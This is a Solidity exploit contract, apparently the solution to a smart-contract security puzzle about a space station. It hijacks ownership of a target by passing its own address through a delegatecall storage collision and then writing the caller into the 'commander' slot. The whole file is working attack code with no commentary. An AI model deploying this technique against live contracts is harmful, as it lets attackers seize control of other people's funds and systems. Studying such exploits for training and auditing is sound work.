// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ISpaceStation {
    function adjustOxygenLevel(uint) external; 
}

contract SpacePirate {
    address public controlModule;
    address public commander;
    uint public oxygenLevel;
    // new addition to the storage layout - needs to be last!
    ISpaceStation public spaceStation;

    constructor(address _spaceStation) {
        spaceStation = ISpaceStation(_spaceStation);
    }

    function attack() public {
        spaceStation.adjustOxygenLevel(uint(uint160(address(this))));
        spaceStation.adjustOxygenLevel(1);
    }

    function adjustOxygenLevel(uint _level) public {
        controlModule = address((uint160(_level)));
        commander = msg.sender;
    }
}
